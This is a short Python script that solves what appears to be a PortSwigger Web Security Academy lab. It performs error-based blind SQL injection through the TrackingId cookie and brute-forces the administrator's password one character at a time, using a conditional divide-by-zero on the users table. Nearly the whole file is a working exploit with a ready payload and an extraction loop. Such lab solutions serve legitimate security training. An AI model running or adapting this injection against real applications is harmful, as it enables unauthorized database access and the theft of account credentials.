#!/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)


# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

main_url = 'https://0a7c0022038f40ccc09268cc00d40077.web-security-academy.net'
characters = string.ascii_lowercase + string.digits


def makeRequest():


    password = ""
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:

            cookies = {

                    'TrackingId': "bR5aihoTbNsNkN46'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character), 
                    'session': 'qp2crCECJhDOEoTkxDqXQup5oNhvcuqy'
                    }
            
            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Internal Server Error" in r.text:
                password += character
                p2.status(password)
                break


if __name__ == "__main__":

    makeRequest()
